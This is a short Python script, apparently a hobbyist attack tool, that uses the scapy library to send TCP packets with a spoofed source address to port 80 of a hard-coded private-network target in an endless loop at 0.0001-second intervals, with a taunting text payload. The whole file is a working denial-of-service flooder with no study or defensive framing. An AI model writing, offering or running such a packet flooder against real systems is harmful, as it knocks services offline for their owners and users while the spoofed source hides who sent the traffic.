from scapy.all import *

def floodz(source,target):
	IPlayer = IP(src=source,dst=target)
	TCPlayer = TCP(sport=0,dport=80)
	RAWLayer=Raw(load="Ayooub kill you with his new idea")
	pkt = IPlayer/TCPlayer/RAWLayer
	send(pkt,inter=0.0001,loop=1)

source = "10.10.10.10"
target = "192.168.12.132"
floodz(source,target)
